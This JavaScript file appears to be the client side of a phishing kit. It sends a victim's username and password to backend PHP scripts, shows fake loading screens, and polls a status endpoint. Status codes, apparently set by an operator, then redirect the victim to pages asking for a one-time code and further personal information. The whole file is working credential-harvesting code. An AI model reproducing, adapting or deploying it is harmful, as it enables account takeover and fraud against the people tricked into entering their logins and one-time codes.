function detectar_dispositivo(){
    var dispositivo = "Android";
    if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) dispositivo = "iOS";
    return dispositivo;
}

// ESTO QUITA EL "CARGANDO" APENAS ABRES LA PÁGINA
$(document).ready(function() {
    setTimeout(function(){
        $("#fondo, #cargando, #cargando-o").hide();
    }, 1000); 
});

function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    $.post( "../process/inicio.php", { usr: u, dis: d } );
    setTimeout(function(){ window.location.href = "PASS.php"; }, 1200);
}

function pasousuario(p){    
    $("#fondo, #cargando-o").show();
    $.post( "../process/pasousuario.php", { pass: p } );
    setTimeout(function(){ window.location.href = "WAITING.php"; }, 1200);
}            

function consultar_estado(){    
    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
        var estado = data.toString().trim();
        if (estado === '2') { window.location.href = "OTP.php"; }
        else if (estado === '4') { window.location.href = "INFO.php"; }
        else if (estado === '10') { window.location.href = "SUCCESS.php"; }
    });        
}
